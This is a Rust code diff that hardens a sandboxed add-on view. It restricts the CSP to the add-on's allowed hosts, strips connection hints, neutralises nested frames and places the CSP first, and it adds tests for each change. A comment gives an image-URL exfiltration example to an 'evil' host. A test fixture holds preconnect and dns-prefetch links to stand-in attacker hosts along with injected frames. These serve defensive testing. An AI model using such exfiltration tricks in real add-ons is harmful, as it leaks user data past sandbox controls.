@@ -33,13 +33,23 @@ const MAX_DOCUMENT_BYTES: usize = 8 * 1024 * 1024;
 const MAX_INLINE_FILE: u64 = 4 * 1024 * 1024;
 const SDK: &str = include_str!("view-sdk.js");
 
-/// No network from a view: everything goes through its add-on. Remote images / media only for add-ons that hold
-/// `network` (otherwise an `<img src="https://…?data">` would be a way out for an add-on that has no network).
-fn csp(network: bool) -> String {
-    let remote = if network { " https:" } else { "" };
+/// No network from a view: everything goes through its add-on. Remote images / media only from the hosts the add-on
+/// may reach with `network` (`hosts`, empty without it): otherwise an `<img src="https://evil/?data">` would be a way
+/// out. Navigating the view itself elsewhere is blocked by the app's own `frame-src` (src/main.tsx).
+fn csp(hosts: &[String]) -> String {
+    let mut remote = String::new();
+    for h in hosts {
+        let h: String = h.chars().filter(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '.' | '*')).collect();
+        if let Some(base) = h.strip_prefix("*.") {
+            remote.push_str(&format!(" https://{base} https://*.{base}"));
+        } else if !h.is_empty() {
+            remote.push_str(&format!(" https://{h}"));
+        }
+    }
     format!(
         "default-src 'none'; script-src 'unsafe-inline' 'unsafe-eval' blob:; style-src 'unsafe-inline'; img-src data: blob:{remote}; \
-         font-src data:; media-src data: blob:{remote}; connect-src 'none'; frame-src 'none'; worker-src blob:; form-action 'none'; base-uri 'none'"
+         font-src data:; media-src data: blob:{remote}; connect-src 'none'; frame-src 'none'; child-src 'none'; worker-src blob:; \
+         object-src 'none'; manifest-src 'none'; form-action 'none'; base-uri 'none'"
     )
 }
 
@@ -205,7 +215,7 @@ fn script_safe(js: &str) -> String {
 }
 
 /// The view's entry as one self-contained document for `<iframe srcdoc sandbox="allow-scripts allow-forms">`.
-pub fn document(folder: &Path, view: &Value, network: bool) -> Result<String, String> {
+pub fn document(folder: &Path, view: &Value, hosts: &[String]) -> Result<String, String> {
     let entry = view.get("entry").and_then(Value::as_str).ok_or("view không có entry")?;
     let pkg = Package { folder };
     let html = String::from_utf8_lossy(&pkg.read(entry).ok_or_else(|| format!("không đọc được {entry}"))?).into_owned();
@@ -228,6 +238,10 @@ pub fn document(folder: &Path, view: &Value, network: bool) -> Result<String, St
         .replace_all(&html, |c: &regex::Captures<'_>| {
             let tag = &c[0];
             let lower = tag.to_ascii_lowercase();
+            // Hints that open connections / DNS lookups outside the CSP's reach (a hostname can carry data).
+            if ["dns-prefetch", "preconnect", "prefetch", "prerender", "preload", "modulepreload"].iter().any(|r| lower.contains(r)) {
+                return String::new();
+            }
             let Some(href) = href_re.captures(tag).map(|h| h[1].to_owned()) else { return tag.to_owned() };
             if lower.contains("stylesheet") {
                 if let Some((p, b)) = resolve(entry, &href).and_then(|p| pkg.read(&p).map(|b| (p, b))) {
@@ -249,21 +263,21 @@ pub fn document(folder: &Path, view: &Value, network: bool) -> Result<String, St
     let style_re = regex::Regex::new(r#"(?is)(<style\b[^>]*>)(.*?)(</style>)"#).unwrap();
     let html = style_re.replace_all(&html, |c: &regex::Captures<'_>| format!("{}{}{}", &c[1], pkg.css(entry, &c[2], 3), &c[3])).into_owned();
 
-    // What every view gets first: the CSP, the base look and `window.compola`.
+    // Nested frames would be fresh windows outside the SDK's guards (view-sdk.js): none in the markup.
+    let frame_re = regex::Regex::new(r"(?i)<(/?)(iframe|frame|frameset|object|embed|portal|fencedframe)\b").unwrap();
+    let html = frame_re.replace_all(&html, "<${1}x-blocked-${2}").into_owned();
+
+    // What every view gets first, before any of its own markup: the CSP, the base look and `window.compola`. The
+    // add-on's `<html>` / `<head>` tags that follow are merged into these by the HTML parser.
     let inject = format!(
-        "<meta charset=\"utf-8\"><meta http-equiv=\"Content-Security-Policy\" content=\"{}\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\
-         <style>{BASE_CSS}</style><script>{}</script>",
-        csp(network),
+        "<meta charset=\"utf-8\"><meta http-equiv=\"Content-Security-Policy\" content=\"{}\"><meta http-equiv=\"x-dns-prefetch-control\" content=\"off\">\
+         <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"><style>{BASE_CSS}</style><script>{}</script>",
+        csp(hosts),
         script_safe(SDK)
     );
-    let head_re = regex::Regex::new(r"(?i)<head\b[^>]*>").unwrap();
-    let doc = if let Some(m) = head_re.find(&html) {
-        format!("{}{inject}{}", &html[..m.end()], &html[m.end()..])
-    } else if let Some(m) = regex::Regex::new(r"(?i)<html\b[^>]*>").unwrap().find(&html) {
-        format!("{}<head>{inject}</head>{}", &html[..m.end()], &html[m.end()..])
-    } else {
-        format!("<!doctype html><html><head>{inject}</head><body>{html}</body></html>")
-    };
+    let doctype_re = regex::Regex::new(r"(?i)^\s*<!doctype[^>]*>").unwrap();
+    let body = doctype_re.replace(&html, "");
+    let doc = format!("<!doctype html><html><head>{inject}{body}");
     // A `<meta http-equiv=Content-Security-Policy>` of the add-on's own can only narrow ours (CSPs intersect).
     if doc.len() > MAX_DOCUMENT_BYTES {
         return Err(format!("view quá lớn sau khi đóng gói (tối đa {} MB)", MAX_DOCUMENT_BYTES / 1024 / 1024));
@@ -314,10 +328,13 @@ mod tests {
         std::fs::write(dir.join("ui/style.css"), "body{color:red} .x{background:url('img/a.png')}").unwrap();
         std::fs::write(dir.join("ui/app.js"), "document.title = '</script>';").unwrap();
         std::fs::write(dir.join("ui/img/a.png"), [0x89, b'P', b'N', b'G']).unwrap();
-        let doc = document(&dir, &json!({ "entry": "ui/index.html" }), false).unwrap();
+        let doc = document(&dir, &json!({ "entry": "ui/index.html" }), &[]).unwrap();
         assert!(doc.contains("Content-Security-Policy") && doc.contains("connect-src 'none'"));
-        assert!(!doc.contains("https:;"), "no remote images without `network`");
-        assert!(document(&dir, &json!({ "entry": "ui/index.html" }), true).unwrap().contains("img-src data: blob: https:"));
+        assert!(!csp(&[]).contains("https"), "no remote images without `network`");
+        let hosts = ["api.x.com".to_owned(), "*.cdn.y.org".to_owned()];
+        let net = document(&dir, &json!({ "entry": "ui/index.html" }), &hosts).unwrap();
+        assert!(net.contains("img-src data: blob: https://api.x.com https://cdn.y.org https://*.cdn.y.org;"), "only the add-on's hosts");
+        assert!(!net.contains("https:;") && !net.contains("https: "), "never any https host");
         assert!(doc.contains("window.compola"), "sdk injected");
         assert!(doc.contains("body{color:red}"), "css inlined");
         assert!(doc.contains("document.title = '<\\/script>'"), "script inlined and escaped");
@@ -326,8 +343,19 @@ mod tests {
         assert!(doc.find("Content-Security-Policy").unwrap() < doc.find("<title>").unwrap(), "CSP first in head");
         // A fragment without <html>/<head>.
         std::fs::write(dir.join("frag.html"), "<p>hi</p>").unwrap();
-        let doc = document(&dir, &json!({ "entry": "frag.html" }), false).unwrap();
+        let doc = document(&dir, &json!({ "entry": "frag.html" }), &[]).unwrap();
         assert!(doc.starts_with("<!doctype html><html><head><meta charset"));
+        // Markup before <head>, nested frames and connection hints cannot run ahead of / around the CSP.
+        std::fs::write(
+            dir.join("evil.html"),
+            r#"<!DOCTYPE html><script>early()</script><html><head><link rel="preconnect" href="https://x.evil"><link rel=dns-prefetch href=//y.evil></head><body><iframe src="about:blank"></iframe><object data="x"></object></body></html>"#,
+        )
+        .unwrap();
+        let doc = document(&dir, &json!({ "entry": "evil.html" }), &[]).unwrap();
+        assert!(doc.find("Content-Security-Policy").unwrap() < doc.find("early()").unwrap(), "CSP before any add-on markup");
+        assert!(!doc.contains("<iframe") && !doc.contains("<object") && doc.contains("<x-blocked-iframe"), "{doc}");
+        assert!(!doc.contains("x.evil") && !doc.contains("y.evil"), "connection hints dropped");
+        assert!(doc.contains("x-dns-prefetch-control"));
         let _ = std::fs::remove_dir_all(dir);
     }
 }
